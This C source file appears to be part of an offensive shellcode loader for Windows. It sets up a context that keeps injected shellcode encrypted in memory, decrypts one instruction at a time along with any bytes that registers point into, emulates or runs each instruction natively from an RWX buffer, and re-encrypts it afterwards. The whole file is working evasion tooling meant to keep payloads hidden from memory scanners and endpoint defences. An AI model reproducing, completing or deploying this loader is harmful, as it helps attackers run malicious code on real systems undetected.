#define _CRT_SECURE_NO_WARNINGS
#include "../crypt/crypt.h"
#include <stdio.h>
#include "handlers.h"
#include "core.h"
#include <iostream>


/*
 * initializes a ShellcodeContext structure with all data needed
 * to safely decrypt, execute, and re-encrypt shellcode instructions.
 */
BOOL Setup(
	HANDLE hProcess,
	PVOID address,
	SIZE_T shellcodeSize,
	PBYTE keys,
	SIZE_T keySize,
	PDWORD instrOffsets,
	PDWORD instrSizes,
	PDWORD regMasks,
	SIZE_T numInstructions,
	EncryptionType encryption,
	OUT ShellcodeContext* outContext
) {

	// validate shellcode parameters
	if (address == NULL || shellcodeSize == 0) {
		printf("[-] Invalid shellcode address or size\n");
		return FALSE;
	}

	// validate encryption keys
	if (keys == NULL || keySize == 0) {
		printf("[-] Invalid keys buffer or keySize\n");
		return FALSE;
	}

	// validate instruction metadata arrays
	if (instrOffsets == NULL || instrSizes == NULL || regMasks == NULL || numInstructions == 0) {
		printf("[-] Invalid instruction metadata (offsets/sizes/masks)\n");
		return FALSE;
	}

	ShellcodeContext sc = { 0 };
	// global variable pointing to the shellcode in the allocated memory
	sc.shellcode = (PBYTE)address;
	sc.shellcodeSize = shellcodeSize;

	// encryption-related data
	sc.keys = keys;
	sc.keySize = keySize;
	sc.encryption = encryption;

	// instruction data
	sc.instrOffsets = instrOffsets;
	sc.instrSizes = instrSizes;
	sc.regMasks = regMasks;
	sc.numInstructions = numInstructions;

	// target process handle
	sc.processHandle = hProcess;
	
	*outContext = sc;

	return TRUE;
}

/*
 * human-readable register names
 * aligned with CONTEXT register order in Windows.
 */
const char* tracked_regs[] = {
	"rax", "rbx", "rcx", "rdx",
	"rsi", "rdi", "rsp", "rbp",
	"r8",  "r9",  "r10", "r11",
	"r12", "r13", "r14", "r15"
};

// total number of tracked registers
const int NUM_TRACKED_REGS = sizeof(tracked_regs) / sizeof(tracked_regs[0]);

/*
 * returns TRUE if the register identified by reg_index
 * is marked as used in the given bitmask.
 */
BOOL RegisterInMask(uint32_t mask, int reg_index) {
	if (reg_index < 0 || reg_index >= NUM_TRACKED_REGS)
		return false;

	return (mask & (1U << reg_index)) != 0;
}

/*
 * identifies bytes in the encrypted shellcode pointed by CPU registers that are required by the current instruction
 * these bytes must be temporarily decrypted to avoid crashes.
 */
size_t GetDangerousBytes(
	CONTEXT* ctx,
	ShellcodeContext* sc,
	DWORD** outOffsets,
	DWORD** outSizes
) {
	const size_t MAX_MATCHES = 8 * NUM_TRACKED_REGS;
	const size_t REG_SIZE = 8;

	// allocate output buffers
	*outOffsets = (DWORD*)malloc(sizeof(DWORD) * MAX_MATCHES);
	*outSizes = (DWORD*)malloc(sizeof(DWORD) * MAX_MATCHES);

	if (!*outOffsets || !*outSizes) {
		free(*outOffsets);
		free(*outSizes);
		*outOffsets = NULL;
		*outSizes = NULL;
		return 0;
	}

	size_t index = 0;
	// valid shellcode address range
	uint64_t base = (uint64_t)sc->shellcode;
	uint64_t end = base + sc->shellcodeSize;

	uint64_t regs[] = {
		ctx->Rax, ctx->Rbx, ctx->Rcx, ctx->Rdx,
		ctx->Rsi, ctx->Rdi, ctx->Rsp, ctx->Rbp,
		ctx->R8,  ctx->R9,  ctx->R10, ctx->R11,
		ctx->R12, ctx->R13, ctx->R14, ctx->R15
	};

	// iterate over all tracked registers
	for (int i = 0; i < sizeof(regs) / sizeof(uint64_t); i++) {
		BOOL regUsedInCurrentInstr = FALSE;

		// check if this register is relevant to the current instruction
		if (RegisterInMask(sc->regMasks[sc->currentInstrIndex], i)) {
			regUsedInCurrentInstr = TRUE;
		}

		// check if the register points inside the shellcode and is used
		// otherwise skip it
		if ((regs[i] >= base && regs[i] < end) && regUsedInCurrentInstr) {
			BOOL done = FALSE;
			uint64_t targetOffset = regs[i] - base;
			int counter = 0;

			while (!done) {
				BOOL found = FALSE;

				for (DWORD j = 0; j < sc->numInstructions; j++) {
					DWORD start = sc->instrOffsets[j];
					DWORD endInstr = start + sc->instrSizes[j];

					if (targetOffset >= start && targetOffset < endInstr) {
						if (index < MAX_MATCHES) {
							(*outOffsets)[index] = start;
							(*outSizes)[index] = sc->instrSizes[j];
							index++;
						}

						targetOffset += sc->instrSizes[j];
						counter += sc->instrSizes[j];
						found = TRUE;
						break;
					}
				}
				// stop if no matching instruction was found
				if (!found || counter >= REG_SIZE) {
					done = TRUE;
				}
			}
		}
	}

	return index;
}

/*
 * main execution loop:
 *  - decrypts only the required instruction
 *  - temporarily decrypts any instructions referenced by registers
 *  - attempts emulation first, falls back to native execution
 *  - immediately re-encrypts all decrypted instructions
 */
BOOL ShellcodeRunner(LPVOID param) {

	// virtual stack size used by the shellcode
	const SIZE_T STACK_SIZE = 0x100000;

	// RWX buffer used for dynamic native execution
	const SIZE_T EXEC_BUFFER_SIZE = 512;

	ShellcodeContext* sc = (ShellcodeContext*)param;
	if (!sc || !sc->shellcode || sc->shellcodeSize == 0) {
		printf("[-] Invalid shellcode context\n");
		return FALSE;
	}

	// allocate RWX execution buffer
	BYTE* execBuffer = (BYTE*)VirtualAlloc(NULL, EXEC_BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!execBuffer) {
		printf("[-] Failed to allocate execution buffer\n");
		return FALSE;
	}
	printf("[!] Allocated execution buffer at: 0x%p\n", execBuffer);

	// capture current thread context
	CONTEXT c = { 0 };
	PCONTEXT ctx = &c;
	ctx->ContextFlags = CONTEXT_FULL | CONTEXT_SEGMENTS;
	RtlCaptureContext(ctx);

	// allocate an isolated virtual stack for shellcode execution
	PVOID shellStack = VirtualAlloc(NULL, STACK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellStack) {
		printf("[-] Stack allocation failed\n");
		return FALSE;
	}

	memset(shellStack, '\0', STACK_SIZE);
	printf("[!] Allocated virtual stack at: 0x%p\n", shellStack);

	// initialize stack registers to the virtual stack
	ctx->Rsp = (uint64_t)shellStack + STACK_SIZE - 0x5000;
	ctx->Rbp = ctx->Rsp;

	DWORD offset;
	BOOL found;

	// initial global decryption pass (single-byte XOR bootstrap)
	for (size_t i = 0; i < sc->shellcodeSize; i++) {
		sc->shellcode[i] = sc->shellcode[i] ^ sc->keys[0];
	}

	// instruction-by-instruction execution loop
	while (TRUE) {
		offset = 0;
		found = FALSE;

		// search for the next instruction
		for (DWORD i = 0; i < sc->numInstructions; i++) {
			if (sc->instrOffsets[i] == sc->currentInstrOffset) {
				offset = sc->instrOffsets[i];
				sc->currentInstrSize = sc->instrSizes[i];
				found = TRUE;
				sc->currentInstrIndex = i;
				break;
			}
		}

		if (!found) {
			printf("[!] offset not found: %d\n", sc->currentInstrOffset);
			printf("[+] Shellcode execution completed\n");
			break;
		}

		// sanity check instruction bounds
		if (offset + sc->currentInstrSize > sc->shellcodeSize || sc->currentInstrSize > MAX_INSTRUCTION_SIZE) {
			printf("[-] Invalid instruction bounds at offset %u (size %u)\n", offset, sc->currentInstrSize);
			break;
		}

		// decrypt the current instruction before execution
		ApplyCryptInstruction(
			&sc->shellcode, 
			offset, 
			sc->currentInstrSize, 
			sc->keys, 
			sc->keySize, 
			sc->encryption
		);

		PBYTE bytes = sc->shellcode + offset;

		// temporarily decrypt bytes referenced by registers
		DWORD* offsets = NULL;
		DWORD* sizes = NULL;
		size_t count = GetDangerousBytes(ctx, sc, &offsets, &sizes);

		for (size_t i = 0; i < count; i++) {
			if (offsets[i] != offset) {
				ApplyCryptInstruction(
					&sc->shellcode, 
					offsets[i], 
					sizes[i], 
					sc->keys, 
					sc->keySize, 
					sc->encryption
				);
			}
		}

		// attempt emulation; fallback to native execution
		if (!HandleInstruction(bytes, offset, sc->currentInstrSize, sc, ctx, execBuffer)) {
			((void(*)())execBuffer)();
		}

		// re-encrypt the current instruction after execution
		ApplyCryptInstruction(
			&sc->shellcode, 
			offset, 
			sc->currentInstrSize, 
			sc->keys, 
			sc->keySize, 
			sc->encryption
		);

		// re-encrypt temporarily decrypted bytes
		for (size_t i = 0; i < count; i++) {
			if (offsets[i] != offset) {
				ApplyCryptInstruction(
					&sc->shellcode, 
					offsets[i], 
					sizes[i], 
					sc->keys, 
					sc->keySize, 
					sc->encryption
				);
			}
		}

		free(offsets);
		free(sizes);
	}

	VirtualFree(execBuffer, 0, MEM_RELEASE);
	return TRUE;
}
